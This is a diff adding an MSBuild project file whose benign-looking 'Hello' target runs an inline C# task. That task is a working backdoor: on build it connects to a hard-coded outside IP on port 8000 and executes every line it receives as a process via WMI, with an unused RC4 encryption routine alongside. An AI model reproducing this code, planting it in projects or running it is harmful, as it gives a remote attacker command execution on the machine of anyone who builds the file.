@@ -1,0 +1,117 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+ <Target Name="Hello">
+ <ClassExample />
+ </Target>
+ <UsingTask
+ TaskName="ClassExample"
+ TaskFactory="CodeTaskFactory"
+ AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+ <Task>
+ 
+ <Code Type="Class" Language="cs">
+ <![CDATA[
+using System;
+using System.IO;
+using System.Management; // Include the System.Management namespace
+using System.Net.Sockets;
+using System.Text;
+using Microsoft.Build.Framework;
+using Microsoft.Build.Utilities;
+
+public class ClassExample : Task, ITask
+{
+    static StreamWriter streamWriter;
+
+    public override bool Execute()
+    {
+        using (TcpClient client = new TcpClient("104.247.164.209", 8000))
+        {
+            using (Stream stream = client.GetStream())
+            {
+                using (StreamReader rdr = new StreamReader(stream))
+                {
+                    streamWriter = new StreamWriter(stream);
+                    StringBuilder strInput = new StringBuilder();
+
+                    while (true)
+                    {
+                        strInput.Append(rdr.ReadLine());
+                        ExecuteWmiCommand(strInput.ToString()); // Execute command via WMI
+                        strInput.Clear(); // Clear the StringBuilder after execution
+                    }
+                }
+            }
+        }
+        return true;
+    }
+
+    private void ExecuteWmiCommand(string command)
+    {
+        try
+        {
+            ManagementClass mc = new ManagementClass("Win32_Process");
+            ManagementBaseObject inParams = mc.GetMethodParameters("Create");
+            inParams["CommandLine"] = command;
+
+            ManagementBaseObject outParams = mc.InvokeMethod("Create", inParams, null);
+            if (outParams != null && outParams["ReturnValue"] != null)
+            {
+                int returnValue = Convert.ToInt32(outParams["ReturnValue"]);
+                if (returnValue == 0)
+                {
+                    Console.WriteLine("Command executed successfully.");
+                }
+                else
+                {
+                    Console.WriteLine("Failed to execute command. Return value: " + returnValue);
+                }
+            }
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine("Error executing WMI command: " + ex.Message);
+        }
+    }
+
+    public static byte[] Encrypt(byte[] pwd, byte[] data)
+    {
+        int a, i, j, k, tmp;
+        int[] key, box;
+        byte[] cipher;
+
+        key = new int[256];
+        box = new int[256];
+        cipher = new byte[data.Length];
+
+        for (i = 0; i < 256; i++)
+        {
+            key[i] = pwd[i % pwd.Length];
+            box[i] = i;
+        }
+        for (j = i = 0; i < 256; i++)
+        {
+            j = (j + box[i] + key[i]) % 256;
+            tmp = box[i];
+            box[i] = box[j];
+            box[j] = tmp;
+        }
+        for (a = j = i = 0; i < data.Length; i++)
+        {
+            a++;
+            a %= 256;
+            j += box[a];
+            j %= 256;
+            tmp = box[a];
+            box[a] = box[j];
+            box[j] = tmp;
+            k = box[(box[a] + box[j]) % 256];
+            cipher[i] = (byte)(data[i] ^ k);
+        }
+        return cipher;
+    }
+}
+ ]]>
+ </Code>
+ </Task>
+ </ UsingTask>
+</Project>
